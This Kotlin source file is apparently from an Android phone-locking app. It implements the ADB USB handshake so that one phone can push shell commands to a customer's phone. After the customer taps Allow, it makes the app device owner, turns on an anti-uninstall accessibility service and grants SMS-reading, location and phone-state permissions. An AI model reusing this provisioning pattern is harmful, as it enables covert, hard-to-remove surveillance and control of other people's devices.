package com.pksafe.lock.manager.util

import android.hardware.usb.*
import android.util.Base64
import android.util.Log
import java.math.BigInteger
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.security.*
import java.security.interfaces.RSAPublicKey
import java.util.zip.CRC32

/**
 * USB Host ADB Engine — Implements full ADB USB protocol.
 * Shopkeeper phone (USB Host) → C-to-C → Customer phone (USB Device).
 * Runs dpm set-device-owner and all permissions without any PC or server.
 */
object UsbAdbEngine {

    private const val TAG = "UsbAdbEngine"

    // ADB Protocol Command IDs
    private const val A_CNXN = 0x4e584e43  // CNXN - connect
    private const val A_AUTH = 0x48545541  // AUTH - authenticate
    private const val A_OPEN = 0x4e45504f  // OPEN - open stream
    private const val A_OKAY = 0x59414b4f  // OKAY - acknowledge
    private const val A_CLSE = 0x45534c43  // CLSE - close stream
    private const val A_WRTE = 0x45545257  // WRTE - write data

    // AUTH subtypes
    private const val AUTH_TOKEN        = 1  // server sends random token
    private const val AUTH_SIGNATURE    = 2  // client signs the token
    private const val AUTH_RSAPUBLICKEY = 3  // client sends RSA public key

    private const val A_VERSION  = 0x01000000
    private const val MAX_PAYLOAD = 4096
    private const val TIMEOUT    = 6000     // ms for USB bulk transfers

    // ADB USB interface identifiers
    private const val ADB_INTERFACE_CLASS    = 0xFF
    private const val ADB_INTERFACE_SUBCLASS = 0x42
    private const val ADB_INTERFACE_PROTOCOL = 0x01

    data class AdbMsg(val command: Int, val arg0: Int, val arg1: Int, val data: ByteArray?)
    data class AdbResult(val success: Boolean, val output: String, val message: String = "")

    // ── Key Pair Generation ───────────────────────────────────────────────────

    fun generateKeyPair(): KeyPair {
        val kpg = KeyPairGenerator.getInstance("RSA")
        kpg.initialize(2048, SecureRandom())
        return kpg.generateKeyPair()
    }

    // ── USB Helpers ───────────────────────────────────────────────────────────

    fun findAdbDevice(usbManager: UsbManager): UsbDevice? {
        return usbManager.deviceList.values.firstOrNull { device ->
            findAdbInterface(device) != null
        }
    }

    private fun findAdbInterface(device: UsbDevice): UsbInterface? {
        for (i in 0 until device.interfaceCount) {
            val intf = device.getInterface(i)
            if (intf.interfaceClass    == ADB_INTERFACE_CLASS &&
                intf.interfaceSubclass == ADB_INTERFACE_SUBCLASS &&
                intf.interfaceProtocol == ADB_INTERFACE_PROTOCOL) {
                return intf
            }
        }
        return null
    }

    private fun findEndpoint(intf: UsbInterface, direction: Int): UsbEndpoint? {
        for (i in 0 until intf.endpointCount) {
            val ep = intf.getEndpoint(i)
            if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK && ep.direction == direction) {
                return ep
            }
        }
        return null
    }

    // ── ADB Message I/O ───────────────────────────────────────────────────────

    private fun sendMsg(conn: UsbDeviceConnection, ep: UsbEndpoint,
                        cmd: Int, arg0: Int, arg1: Int, data: ByteArray?) {
        val dataLen = data?.size ?: 0
        val crc = if (data != null) {
            val c = CRC32(); c.update(data); c.value.toInt()
        } else 0

        val header = ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN).apply {
            putInt(cmd)
            putInt(arg0)
            putInt(arg1)
            putInt(dataLen)
            putInt(crc)
            putInt(cmd xor 0xFFFFFFFF.toInt())
        }.array()

        conn.bulkTransfer(ep, header, header.size, TIMEOUT)
        if (data != null && data.isNotEmpty()) {
            conn.bulkTransfer(ep, data, data.size, TIMEOUT)
        }
    }

    private fun readMsg(conn: UsbDeviceConnection, ep: UsbEndpoint,
                        timeoutMs: Int = TIMEOUT): AdbMsg? {
        val header = ByteArray(24)
        val read = conn.bulkTransfer(ep, header, 24, timeoutMs)
        if (read < 24) return null

        val buf = ByteBuffer.wrap(header).order(ByteOrder.LITTLE_ENDIAN)
        val cmd     = buf.int
        val arg0    = buf.int
        val arg1    = buf.int
        val dataLen = buf.int
        // skip crc32 and magic
        buf.int; buf.int

        val data = if (dataLen > 0 && dataLen <= MAX_PAYLOAD) {
            val d = ByteArray(dataLen)
            conn.bulkTransfer(ep, d, dataLen, TIMEOUT)
            d
        } else null

        return AdbMsg(cmd, arg0, arg1, data)
    }

    // ── RSA Key Encoding for ADB ──────────────────────────────────────────────

    /** Convert BigInteger to little-endian byte array of exactly `size` bytes */
    private fun toLe(n: BigInteger, size: Int): ByteArray {
        val raw = n.toByteArray()
        val result = ByteArray(size)
        val srcOff = if (raw.isNotEmpty() && raw[0] == 0.toByte()) 1 else 0
        val srcLen = raw.size - srcOff
        for (i in 0 until minOf(srcLen, size)) {
            result[i] = raw[srcOff + srcLen - 1 - i]
        }
        return result
    }

    /**
     * Encode RSA public key in ADB wire format (AOSP android_pubkey.h).
     * Struct: modulus_size_words(4) + n0inv(4) + n[256] + rr[256] + exponent(4) = 524 bytes
     */
    private fun encodeAdbPublicKey(publicKey: PublicKey, deviceName: String): ByteArray {
        val rsaKey = publicKey as RSAPublicKey
        val n  = rsaKey.modulus
        val e  = rsaKey.publicExponent.toInt()
        val modBytes = 256  // 2048-bit / 8

        // n0inv = -(n^-1 mod 2^32)
        val r32     = BigInteger.ONE.shiftLeft(32)
        val nMod32  = n.mod(r32)
        val n0inv   = r32.subtract(nMod32.modInverse(r32)).toLong().toInt()

        // rr = 2^(modBytes*8*2) mod n  = 2^4096 mod n
        val rr = BigInteger.ONE.shiftLeft(modBytes * 8 * 2).mod(n)

        val buf = ByteBuffer.allocate(4 + 4 + modBytes + modBytes + 4)
            .order(ByteOrder.LITTLE_ENDIAN)
        buf.putInt(modBytes / 4)   // modulus_size_words = 64
        buf.putInt(n0inv)
        buf.put(toLe(n, modBytes))
        buf.put(toLe(rr, modBytes))
        buf.putInt(e)

        val b64 = Base64.encodeToString(buf.array(), Base64.NO_WRAP)
        return "$b64 $deviceName\u0000".toByteArray(Charsets.UTF_8)
    }

    /** Sign ADB auth token using SHA1withRSA (PKCS#1 v1.5) */
    private fun signToken(privateKey: PrivateKey, token: ByteArray): ByteArray? = try {
        val sig = Signature.getInstance("SHA1withRSA")
        sig.initSign(privateKey)
        sig.update(token)
        sig.sign()
    } catch (e: Exception) {
        Log.w(TAG, "Token signing failed: ${e.message}")
        null
    }

    // ── Main Setup ────────────────────────────────────────────────────────────

    fun runFullSetup(
        usbManager: UsbManager,
        device: UsbDevice,
        keyPair: KeyPair,
        onLog: (String) -> Unit
    ): AdbResult {
        val adbInterface = findAdbInterface(device)
            ?: return AdbResult(false, "", "ADB interface nahi mila.\nUSB Debugging enabled hai?")

        val conn = usbManager.openDevice(device)
            ?: return AdbResult(false, "", "USB device open nahi hua.\nPermission deni hogi.")

        if (!conn.claimInterface(adbInterface, true)) {
            conn.close()
            return AdbResult(false, "", "USB interface claim nahi ho saka.")
        }

        val epOut = findEndpoint(adbInterface, UsbConstants.USB_DIR_OUT)
            ?: run { conn.close(); return AdbResult(false, "", "USB OUT endpoint nahi mila.") }
        val epIn  = findEndpoint(adbInterface, UsbConstants.USB_DIR_IN)
            ?: run { conn.close(); return AdbResult(false, "", "USB IN endpoint nahi mila.") }

        return try {
            onLog("USB connected. ADB handshake shuru...")

            // ── 1. CNXN handshake ─────────────────────────────────────────────
            val cnxnData = "host::ro.product.name=pksafe\u0000".toByteArray()
            sendMsg(conn, epOut, A_CNXN, A_VERSION, MAX_PAYLOAD, cnxnData)

            // ── 2. Auth state machine ─────────────────────────────────────────
            // ADB auth flow:
            // 1. Device sends AUTH_TOKEN(challenge)
            // 2. We try AUTH_SIGNATURE — if device trusts our key → CNXN (done!)
            // 3. If device doesn't trust key → sends another AUTH_TOKEN
            // 4. We send AUTH_RSAPUBLICKEY → device shows "Allow USB Debugging?" dialog
            // 5. User taps Allow → device sends AUTH_TOKEN again
            // 6. We sign it → device sends CNXN (done!)
            var connected = false
            // authState: 0=initial, 1=sig_sent (waiting for accept or new challenge), 2=pubkey_sent (waiting for user Allow)
            var authState = 0

            repeat(12) {
                if (connected) return@repeat

                // After pubkey sent, wait longer (user needs time to tap Allow)
                val timeout = if (authState == 2) 25000 else 10000
                val msg = readMsg(conn, epIn, timeout) ?: return@repeat

                when (msg.command) {
                    A_AUTH -> {
                        if (msg.arg0 == AUTH_TOKEN && msg.data != null) {
                            when (authState) {
                                0 -> {
                                    // First challenge: try signature (works if key already trusted)
                                    val sig = signToken(keyPair.private, msg.data)
                                    if (sig != null) {
                                        sendMsg(conn, epOut, A_AUTH, AUTH_SIGNATURE, 0, sig)
                                        onLog("Auth signature bhej raha hai (attempt 1)...")
                                        authState = 1
                                    }
                                }
                                1 -> {
                                    // Signature was rejected — device doesn't know our key yet.
                                    // Must send RSA public key to trigger "Allow" dialog on device.
                                    val pubKeyBytes = encodeAdbPublicKey(keyPair.public, "PKLocker")
                                    sendMsg(conn, epOut, A_AUTH, AUTH_RSAPUBLICKEY, 0, pubKeyBytes)
                                    authState = 2
                                    onLog("📱 Samsung par 'Allow USB Debugging?' dialog aaya hoga!")
                                    onLog("⚠️ ALLOW dabain — phir automatically connect ho jayega.")
                                }
                                2 -> {
                                    // User tapped Allow! Now sign the new challenge.
                                    val sig = signToken(keyPair.private, msg.data)
                                    if (sig != null) {
                                        sendMsg(conn, epOut, A_AUTH, AUTH_SIGNATURE, 0, sig)
                                        onLog("✅ Key accepted! Final signature bhej raha hai...")
                                    }
                                }
                            }
                        }
                    }
                    A_CNXN -> {
                        val banner = msg.data?.let { String(it) } ?: "device"
                        onLog("✅ ADB Connected! ($banner)")
                        connected = true
                    }
                }
            }

            if (!connected) {
                val hint = if (authState == 2)
                    "Samsung par 'Allow USB Debugging?' dialog mein ALLOW dabain."
                else
                    "Cable check karein aur USB Debugging ON hai?"
                return AdbResult(false, "", "ADB auth timeout.\n$hint")
            }


            // ── 3. Run all setup commands ─────────────────────────────────────
            val commands = listOf(
                "dpm set-device-owner com.pksafe.lock.manager/.receiver.AdminReceiver"
                        to "Device Owner",
                "appops set com.pksafe.lock.manager SYSTEM_ALERT_WINDOW allow"
                        to "Overlay Permission",
                "settings put secure enabled_accessibility_services com.pksafe.lock.manager/com.pksafe.lock.manager.service.AntiUninstallService"
                        to "Accessibility Guard",
                "settings put secure accessibility_enabled 1"
                        to "Accessibility Enabled",
                "pm grant com.pksafe.lock.manager android.permission.RECEIVE_SMS"
                        to "SMS Permission",
                "pm grant com.pksafe.lock.manager android.permission.READ_SMS"
                        to "Read SMS",
                "pm grant com.pksafe.lock.manager android.permission.ACCESS_FINE_LOCATION"
                        to "Location",
                "pm grant com.pksafe.lock.manager android.permission.READ_PHONE_STATE"
                        to "Phone State"
            )

            val fullOutput = StringBuilder()
            var localId = 1

            for ((cmd, label) in commands) {
                val openData = "shell:$cmd\u0000".toByteArray()
                sendMsg(conn, epOut, A_OPEN, localId, 0, openData)

                var remoteId  = 0
                var cmdOutput = ""
                var closed    = false

                repeat(8) {
                    if (closed) return@repeat
                    val msg = readMsg(conn, epIn, 4000) ?: run { closed = true; return@repeat }
                    when (msg.command) {
                        A_OKAY -> {
                            remoteId = msg.arg0
                            sendMsg(conn, epOut, A_OKAY, localId, remoteId, null)
                        }
                        A_WRTE -> {
                            cmdOutput += msg.data?.let { String(it, Charsets.UTF_8) } ?: ""
                            sendMsg(conn, epOut, A_OKAY, localId, msg.arg0, null)
                        }
                        A_CLSE -> closed = true
                    }
                }

                val resultLine = cmdOutput.trim()
                val icon = if (resultLine.contains("Error") || resultLine.contains("Exception")) "❌" else "✅"
                onLog("$icon $label${if (resultLine.isNotEmpty()) ": $resultLine" else ""}")
                fullOutput.appendLine(resultLine)
                localId++
            }

            val success = fullOutput.contains("Success") || fullOutput.contains("set to package")
            AdbResult(success, fullOutput.toString(),
                if (success) "🎉 Setup complete!" else "❌ Device Owner set nahi hua — logs dekho.")

        } catch (e: Exception) {
            Log.e(TAG, "ADB setup error", e)
            AdbResult(false, "", "Error: ${e.message}")
        } finally {
            try { conn.releaseInterface(adbInterface) } catch (_: Exception) {}
            try { conn.close() } catch (_: Exception) {}
        }
    }
}
